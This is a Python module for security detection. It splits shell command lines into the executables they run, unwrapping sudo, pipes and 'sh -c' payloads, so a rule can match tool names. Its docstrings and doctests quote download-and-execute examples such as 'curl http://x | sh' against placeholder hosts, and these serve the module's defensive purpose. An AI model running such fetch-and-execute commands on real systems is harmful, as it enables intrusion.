"""Reading the executables invoked by a command line.

A stored command event keeps the raw command line in ``details.command_line``.
Matching that string as a whole is not good enough for RF-11: an attacker runs
``sudo wget http://x``, ``curl http://x | sh`` or ``sh -c "wget http://x"`` and
the interesting executable is never the first token of the line.

:func:`invoked_commands` therefore splits a line the way a shell would and
returns the executable of every segment, so a rule can compare a short, fixed
list of names against it. Comparison is on the base name, because
``/usr/bin/wget`` and ``wget`` are the same tool.
"""

from __future__ import annotations

import re
import shlex
from pathlib import PurePosixPath

#: A variable assignment, which a shell sets instead of running.
_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

#: Characters that separate one command from the next in a shell line.
SEPARATOR_CHARS = ";&|()\n"

#: Tokens that separate one command from the next once the line is split.
SEPARATORS = frozenset({"|", "||", "&&", ";", ";;", "&", "\n", "(", ")", "{", "}"})

#: Programs whose job is to run another program, so the executable to look at is
#: the one that follows them: ``sudo wget x`` runs wget.
COMMAND_WRAPPERS = frozenset(
    {
        "sudo",
        "doas",
        "su",
        "nohup",
        "time",
        "nice",
        "ionice",
        "stdbuf",
        "env",
        "setsid",
        "xargs",
        "command",
        "exec",
        "busybox",
    }
)

#: Interpreters whose payload is a command line of its own (``sh -c "..."``).
SHELL_INTERPRETERS = frozenset({"sh", "bash", "dash", "zsh", "ksh", "ash", "busybox"})

#: Options that introduce the payload of a shell interpreter.
PAYLOAD_FLAGS = frozenset({"-c", "-lc", "-ic", "-cl"})


def invoked_commands(command_line: str | None) -> tuple[str, ...]:
    """Return the executables a command line runs, in order of appearance.

    Only the executable of each command is reported, never its arguments, so
    ``grep wget auth.log`` reports grep and not wget. Inline code is not read as
    a command line, since a program passed to ``python -c`` is not a command.

    >>> invoked_commands("wget http://example.test/x.sh")
    ('wget',)
    >>> invoked_commands("sudo /usr/bin/curl -s http://x | sh")
    ('curl', 'sh')
    >>> invoked_commands('sh -c "wget http://x"')
    ('sh', 'wget')
    >>> invoked_commands("echo wget")
    ('echo',)
    >>> invoked_commands("python3 -c 'import os'")
    ('python3',)
    """

    if command_line is None:
        return ()

    found: list[str] = []
    for segment in _segments(command_line):
        _collect(segment, found)
    return tuple(found)


def _split_on_separators(command_line: str) -> list[str]:
    """Cut a command line where a shell would run the next command.

    Quoted text is kept together, so ``echo "a;b"`` is one command, and the
    separators are honoured without surrounding spaces, so ``ls;nc`` is two.
    """

    parts: list[str] = []
    buffer: list[str] = []
    quote: str | None = None
    index = 0
    while index < len(command_line):
        char = command_line[index]
        if quote is not None:
            buffer.append(char)
            if char == quote:
                quote = None
        elif char in "'\"":
            quote = char
            buffer.append(char)
        elif char in SEPARATOR_CHARS:
            parts.append("".join(buffer))
            buffer = []
            # "&&" and "||" are one separator, and the extra character would
            # otherwise start an empty command.
            if char in "|&" and command_line[index + 1 : index + 2] in {"&", "|"}:
                index += 1
        else:
            buffer.append(char)
        index += 1
    parts.append("".join(buffer))
    return [part for part in parts if part.strip()]


def _segments(command_line: str) -> list[list[str]]:
    """Split a command line into the token lists a shell would execute."""

    segments: list[list[str]] = []
    for part in _split_on_separators(command_line):
        try:
            tokens = shlex.split(part, posix=True)
        except ValueError:
            tokens = part.split()

        current: list[str] = []
        for token in tokens:
            if token in SEPARATORS:
                if current:
                    segments.append(current)
                current = []
            else:
                current.append(token)
        if current:
            segments.append(current)
    return segments


def _collect(segment: list[str], found: list[str]) -> None:
    """Append the executable of one segment, unwrapping inline payloads."""

    index = 0
    while index < len(segment):
        executable = _base_name(segment[index])
        if not executable:
            # An option, never an executable.
            index += 1
            continue
        if executable in COMMAND_WRAPPERS:
            # The program that matters is the one this one runs.
            index += 1
            continue

        found.append(executable)

        following = segment[index + 1] if index + 1 < len(segment) else None
        if (
            executable in SHELL_INTERPRETERS
            and following in PAYLOAD_FLAGS
            and index + 2 < len(segment)
        ):
            for nested in _segments(" ".join(segment[index + 2 :])):
                _collect(nested, found)
        # Whatever follows the executable are its arguments, except for the
        # inline code of an interpreter, which is a program and not a command.
        return


def _base_name(token: str) -> str:
    """Return the base name of a path, so ``/tmp/.x/wget`` is ``wget``.

    Options and variable assignments are not executables, so they report
    nothing: ``env FOO=1 curl x`` runs curl and not ``FOO=1``.
    """

    if token.startswith("-") or _ASSIGNMENT.match(token):
        return ""
    name = PurePosixPath(token).name
    return name.lower()
